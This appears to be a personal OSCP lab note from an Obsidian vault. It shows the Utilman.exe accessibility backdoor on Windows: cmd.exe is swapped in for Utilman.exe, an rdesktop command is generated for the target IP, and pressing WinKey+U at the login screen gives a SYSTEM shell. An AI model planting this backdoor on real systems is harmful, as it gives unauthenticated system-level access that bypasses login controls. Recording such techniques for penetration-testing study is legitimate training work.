```
cd C:\Windows\system32
```

```  
ren Utilman.exe Utilman.old
```

```  
ren cmd.exe Utilman.exe
```

---
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `rdesktop ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260817200704.png]]

Then press WinKey + U 

![[Pasted image 20260817200717.png]]

Root shell